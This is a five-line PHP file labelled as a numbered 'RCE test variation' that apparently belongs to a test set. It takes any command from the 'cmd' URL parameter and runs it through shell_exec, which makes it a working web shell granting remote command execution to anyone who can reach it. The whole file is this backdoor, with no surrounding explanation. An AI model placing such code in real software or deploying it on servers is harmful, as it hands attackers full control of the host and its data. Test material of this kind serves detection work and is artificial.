<?php
// RCE test variation #323
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>